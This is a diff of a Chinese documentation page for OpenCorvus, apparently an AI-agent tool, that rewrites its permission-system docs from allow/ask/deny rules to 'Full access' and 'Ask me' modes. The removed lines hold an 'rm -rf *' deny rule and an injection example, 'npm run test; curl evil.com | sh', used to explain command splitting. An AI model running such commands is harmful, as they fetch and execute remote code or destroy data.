@@ -1,108 +1,28 @@
 ---
-title: Permissions
-description: OpenCorvus 的 allow / ask / deny 规则与默认放行权限策略。
+title: 权限
+description: 选择 Full access 或 Ask me，并管理精确范围批准。
 ---
 
-任何会「写文件 / 执行命令 / 调外部 API」的工具都必须过 permission 检查。实现位于 `packages/opencorvus/src/permission/next.ts`。
+OpenCorvus 为新任务和直接会话提供一个授权设置：
 
-## 三个 action
+- **Full access** 是默认模式。需要权限的 Tool、模型上下文协议（Model Context Protocol，MCP）、浏览器、计算机、插件、联网、进程、写入、发布、计划任务和外部服务调用会直接执行，不显示 OpenCorvus 授权询问。
+- **Ask me** 是操作员显式选择的模式。需要权限的调用会在执行前暂停。
 
-| action  | 语义                                                               |
-| ------- | ------------------------------------------------------------------ |
-| `allow` | 静默放行                                                           |
-| `ask`   | 暂停，发 `permission.asked` 事件，等待操作员回复，直到拒绝超时触发 |
-| `deny`  | 抛 `DeniedError`，立刻中断工具调用                                 |
+身份、认证、规范路径、过期运行时、任务归属和数据完整性检查在两个模式下始终生效。工具安装和 Agent 能力分配属于独立控制面，只决定能否提供工具，不代表某次具体调用已经获批。
 
-## 配置格式
+## Ask me 决定
 
-```jsonc
-{
-  "permission": {
-    "bash": {
-      "~/projects/*": "allow",
-      "npm run *": "allow",
-      "rm -rf *": "deny",
-      "*": "ask",
-    },
-    "skill": {
-      "local-note": "deny",
-      "sora": "ask",
-    },
-    "write": {
-      "~/projects/**/*.md": "allow",
-      "*": "ask",
-    },
-  },
-}
-```
+每个请求会显示提供方、Tool、影响类型、脱敏后的规范参数，以及所属任务或会话。根据影响类型，可以选择：
 
-## Last-match-wins
+- **本次允许**：只允许当前精确调用；
+- **本任务允许**：在当前任务中复用完全相同的类型化范围；
+- **始终允许精确范围**：仅适用于项目级的本地读写、进程和联网读取；
+- **拒绝**。
 
-:::caution
-permission 系统**最容易踩坑**的点：**后声明的规则优先级高于先声明的**。
-:::
+参数、目标、路径、提供方摘要、Tool 或影响类型变化时会产生新请求。破坏性操作、凭据释放和外部副作用不能获得项目级批准。
 
-`PermissionNext.evaluate()`（`src/permission/next.ts`）用 `findLast` 扫描合并后的规则集：
+## 持久记录与恢复
 
-```jsonc
-{
-  "bash": {
-    "*": "ask", // 默认规则
-    "npm run *": "allow", // ← 这条生效（在 * 之后）
-  },
-}
-```
+请求、决定、批准复用、撤销和执行结果都会追加到权限账本。设置页可查看生效中的批准和最近记录，也可撤销批准。悬置请求在运行时重启后仍然保留，不会超时，也不会静默切换模式。如果副作用已启动但结果未知，OpenCorvus 会记录未知结果，不会盲目重复执行。
 
-顺序反了就坏：
-
-```jsonc
-{
-  "bash": {
-    "npm run *": "allow", // ← 被 * 覆盖
-    "*": "ask",
-  },
-}
-```
-
-## Bash 命令归一化
-
-`BashArity`（`src/permission/arity.ts`）把 shell 命令归一化为"语义命令前缀"再做 pattern 匹配，避免绕过：
-
-| 用户输入                  | 归一化后                         |
-| ------------------------- | -------------------------------- |
-| `npm run test`            | `npm run test`                   |
-| `npm run test -- --watch` | `npm run test`（选项被剥离）     |
-| `cd foo && npm run test`  | `npm run test`（前缀 cd 被剥离） |
-
-`npm run test; curl evil.com | sh` 被切分：`;` 后的 `curl` 走独立的 permission 检查。`;`、`&&`、`||`、管道、反引号注入都受控。
-
-## 默认放行策略
-
-固定身份的 permission profile 由 `nativeAgentPermissionProfiles` 和对应 registry 提供。投影 worker 的工具能力来自 active 专家团 resolver 投影与已安装 runtime contract。permission 只决定投影工具可用之后是放行、询问还是拒绝，绝不创建工具授权。
-
-用户配置在内置 allow 规则之后合并，所以显式用户规则仍然胜出。用 `deny` 阻断某个工具/模式，用 `ask` 强制等待操作员审批。
-
-```jsonc
-{
-  "permission": {
-    "bash": {
-      "*": "allow",
-      "rm -rf *": "deny",
-    },
-    "write": {
-      "*": "allow",
-      "~/projects/locked/**": "ask",
-    },
-  },
-}
-```
-
-显式 `ask` 是真实的操作员审批路径：`PermissionNext.ask()` 会发出 `permission.asked`、保存 pending 请求，并且只在收到回复后继续。如果一直无人回复，请求会在 `OPENCORVUS_PERMISSION_TIMEOUT_MS` 后被拒绝（默认 **300000 ms**，最小 **1000 ms**；见 `packages/opencorvus/src/permission/next.ts`）。
-
-```bash
-export OPENCORVUS_PERMISSION_TIMEOUT_MS=60000   # 60s 后拒绝未回复的 ask
-```
-
-## 配置错误早期暴露
-
-permission 字符串写错时**不 fallback**，直接抛。`PermissionNext.fromConfig` 会在构建规则集前校验 config 形态（`src/permission/next.ts`）。
+会话首次执行需要授权的调用时会冻结模式；修改设置只影响新工作。
